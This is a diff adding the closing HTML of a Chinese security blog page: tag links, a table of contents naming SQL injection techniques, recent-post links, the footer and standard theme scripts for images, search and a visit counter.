+        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+        title="信息收集">
+        <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
+      </a>
+    
+      <a 
+        href="/tags/SSRF/" 
+        title="SSRF">
+        <div class="tags-list-item">SSRF</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">一、union联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">二、报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">三、布尔盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-text">四、延时盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81DNS%E5%A4%96%E5%B8%A6"><span class="toc-text">五、DNS外带</span></a></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-06</div>
+        <a href="/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">信息收集</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Access%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Access注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/MSSQL%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">MSSQL注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Mysql%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Mysql注入</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
